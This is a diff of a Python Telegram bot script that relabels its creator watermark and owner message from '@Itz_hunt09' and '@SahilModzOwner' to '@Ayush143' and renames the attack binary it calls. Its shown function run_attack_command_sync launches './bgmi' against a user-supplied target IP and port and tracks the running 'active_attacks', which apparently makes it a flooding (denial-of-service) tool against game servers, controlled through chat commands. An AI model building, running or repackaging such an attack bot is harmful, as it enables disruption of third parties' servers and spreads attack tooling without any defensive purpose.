@@ -10,7 +10,7 @@ import subprocess
 from datetime import datetime, timedelta
 
 # Watermark verification
-CREATOR = "This File Is Made By @SahilModzOwner"
+CREATOR = "This File Is Made By @Ayush143"
 BotCode = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"
 
 def verify():
@@ -35,8 +35,8 @@ def verify():
 
     # Check if the computed hash matches the stored hash
     if computed_hash != stored_hash:
-        raise Exception("This File Is Made By @Itz_hunt09.")
-    print("This File Is Made By @Itz_hunt09.")
+        raise Exception("This File Is Made By @Ayush143.")
+    print("This File Is Made By @Ayush143.")
 
 verify()
 
@@ -113,7 +113,7 @@ def send_not_approved_message(chat_id):
 # Run attack command synchronously
 def run_attack_command_sync(target_ip, target_port, action):
     if action == 1:
-        process = subprocess.Popen(["./bgmiv1", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(["./bgmi", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[(target_ip, target_port)] = process.pid
     elif action == 2:
         pid = active_attacks.pop((target_ip, target_port), None)
@@ -319,7 +319,7 @@ def broadcast_message(message):
 # /owner command handler
 @bot.message_handler(commands=['owner'])
 def send_owner_info(message):
-    owner_message = "This Bot Has Been Developed By @Itz_hunt09"
+    owner_message = "This Bot Has Been Developed By @Ayush143"
     bot.send_message(message.chat.id, owner_message)
 
 @bot.message_handler(commands=['approve', 'disapprove'])
